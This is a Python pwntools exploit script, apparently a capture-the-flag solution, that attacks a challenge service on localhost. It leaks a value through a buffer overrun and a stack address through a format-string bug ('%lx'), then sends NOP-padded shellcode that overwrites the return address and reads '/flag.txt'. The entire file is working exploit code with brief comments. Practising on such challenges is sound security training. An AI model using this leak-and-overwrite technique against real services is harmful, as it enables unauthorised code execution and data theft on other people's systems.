from pwn import *

context.arch = "amd64"
context.os = "linux"

with remote('localhost', 5000) as p:
    p.recvuntil(b'you?\n>')
    log.progress("sending username")
    # overwriting the null terminator so we can leak the honk num 
    username = b'A'*64
    p.sendline(username)
    p.recvuntil(b'so ')
    p.recv(64)
    nhonks=u8(p.recv(1))
    log.progress(f"leaked {nhonks}")
    p.sendline(f'{nhonks}')
    p.recvuntil(b'again?')
    # format string exploit to leak a stackaddr so we know where to jump in the end.
    p.sendline("hehe%lx")
    p.recvuntil(b'hehe')
    stackleak=p.recvuntil(b' ').strip().ljust(8, b'\x00')
    log.progress(f"we have {stackleak}")
    # this will lead us in the part of the stack write after the %s.
    # which reads "wow %s you're so good". the end of the %s is the stackleak
    # we get, -6 of that will get us at the "wow". so now we have  a stack address.
    # that address is at +0x120 of rsp, (which is where our shellcode buffer will land)
    # then the rip lies at 0x178 from there.
    shellbase = int(stackleak, 16)-6-0x120
    basepointer = shellbase+0x190 # we need to fix the base pointer back to what it was so that things don't go south
    p.recvuntil(b'world?')
    pload = asm(shellcraft.cat('/flag.txt'))
    log.progress(f"cat flag payload totlen {len(pload)} : {pload} shellbase is {hex(shellbase)}")
    #totpload = pload+asm(shellcraft.nop()*(0x160-len(pload)))+p64(basepointer)+p64(shellbase)
    totpload = pload+asm(shellcraft.nop()*(0x178-len(pload)))+p64(shellbase)
    log.progress(f"payload totlen {len(totpload)} : {totpload}")
    p.sendline(totpload)
    p.interactive()
